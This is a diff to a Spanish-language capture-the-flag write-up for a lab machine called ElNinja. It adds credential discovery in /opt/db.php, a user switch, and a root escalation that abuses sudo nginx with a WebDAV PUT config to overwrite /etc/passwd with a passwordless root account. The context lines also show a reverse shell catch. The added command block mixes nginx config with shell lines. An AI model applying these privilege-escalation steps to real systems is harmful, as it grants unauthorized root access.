@@ -76,48 +76,11 @@ PORT     STATE SERVICE    VERSION
 5432/tcp open  postgresql PostgreSQL DB (Spanish)
 9999/tcp open  abyss?
 ```
+<img width="1015" height="619" alt="image" src="https://github.com/user-attachments/assets/77520c7c-3adc-45c9-85e0-4dee601325de" />
 
 ---
 
-## 📡 **Port Scan UDP**
-
-```bash
-❯ nmap -sU -p 53,123,161,500,514,520,623,1434,1900,4500,49152 192.168.91.208
-PORT      STATE         SERVICE
-53/udp    open|filtered domain
-161/udp   open          snmp
-```
-
-### **SNMP — Información filtrada**
-
-```bash
-❯ snmpwalk -v2c -c public 192.168.91.208
-iso.3.6.1.2.1.1.4.0 = STRING: "Header: X-Api-Key"
-iso.3.6.1.2.1.1.6.0 = STRING: "Endpoint: /api/v1/internal/search"
-```
-
-🔑 Descubrimos un **endpoint interno** y un **header de autenticación**.
-
----
-
-## 🌐 **Port 5000 — Web THL Ninjas**
-
-```bash
-❯ ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt \
-       -u http://192.168.91.208:5000/FUZZ \
-       -e .php,.html,.js,.txt,.md,.py -fs 17334
-
-about        [Status: 200]
-login        [Status: 200]
-services     [Status: 200]
-report       [Status: 200]
-logout       [Status: 302]
-dashboard    [Status: 302]
-```
-
----
-
-## 🔐 **Port 9999 — NoSQL Injection (pymongo)**
+## 🔐 **Port — NoSQL Injection (pymongo)**
 
 ### **Bypass de autenticación**
 
@@ -225,7 +188,10 @@ FILES_BASE = "/"
   }
 }
 ```
-
+<img width="930" height="304" alt="image" src="https://github.com/user-attachments/assets/10b46327-4b7f-4fa5-8aa1-edb508050518" />
+```bash
+psql -h 192.168.43.179 -U postgres
+```
 ---
 
 ## 🐘 **RCE via PostgreSQL SuperUser**
@@ -239,6 +205,8 @@ thlninjas_internal=# \du
  postgres      | Superusuario, Crear rol, Crear BD, Replicación, Ignora RLS
  superadmin    | Superusuario
 ```
+<img width="1017" height="629" alt="image" src="https://github.com/user-attachments/assets/33ff657c-da18-426d-9e29-9205d9b1634d" />
+
 
 ### **Reverse Shell**
 
@@ -253,6 +221,7 @@ listening on [any] 4444 ...
 connect to [192.168.91.191] from (UNKNOWN) [192.168.91.208] 54968
 postgres@debian:/var/lib/postgresql/15/main$
 ```
+<img width="962" height="591" alt="image" src="https://github.com/user-attachments/assets/700ec7ee-3c05-41c8-beb6-080f92880596" />
 
 ---
 
@@ -263,5 +232,64 @@ postgres@debian:/var/lib/postgresql/15/main$ uname -a
 Linux debian 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux
 ```
 
+** Entramos al directorio /opt/db.php**
+
 ```bash
-postgres@debian:/var/lib/postgresql/15/main$ curl -s https://raw
+postgres@TheHackersLabs-ElNinja:/var/lib/postgresql$ cd /opt/
+postgres@TheHackersLabs-ElNinja:/opt$ ls
+db.php
+postgres@TheHackersLabs-ElNinja:/opt$ cat db.php
+<?php
+$db_credentials = [
+    'username' => 'wvverez',
+    'password' => 'dun1bd12dh979d178gd5%djnashda'
+];
+?>
+postgres@TheHackersLabs-ElNinja:/opt$
+```
+
+
+```bash
+postgres@TheHackersLabs-ElNinja:/opt$ su wvverez
+Contraseña:
+wvverez@TheHackersLabs-ElNinja:/opt$ id
+uid=1001(wvverez) gid=1001(wvverez) grupos=1001(wvverez),100(users)
+wvverez@TheHackersLabs-ElNinja:/opt$
+```
+
+**Root**
+
+```bash
+wvverez@TheHackersLabs-ElNinja:~$ sudo -l
+sudo: unable to resolve host TheHackersLabs-ElNinja: Nombre o servicio desconocido
+Matching Defaults entries for wvverez on TheHackersLabs-ElNinja:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User wvverez may run the following commands on TheHackersLabs-ElNinja:
+    (root) NOPASSWD: /usr/sbin/nginx
+```
+
+**passwd**
+
+```bash
+cp /etc/passwd /tmp/passwd_new
+
+/tmp/pwn.conf。 root 
+echo 'pwned::0:0:root:/root:/bin/bash' >> /tmp/passwd_new
+user root;
+events { worker_connections 1024; }
+http {
+    server {
+        listen 9005;
+        
+     
+        root /;
+        autoindex on;
+      
+        dav_methods PUT;
+    }
+}
+sudo /usr/sbin/nginx -c /tmp/pwn.conf
+curl -X PUT -T /tmp/passwd_new http://127.0.0.1:9005/etc/passwd
+su pwned
+```
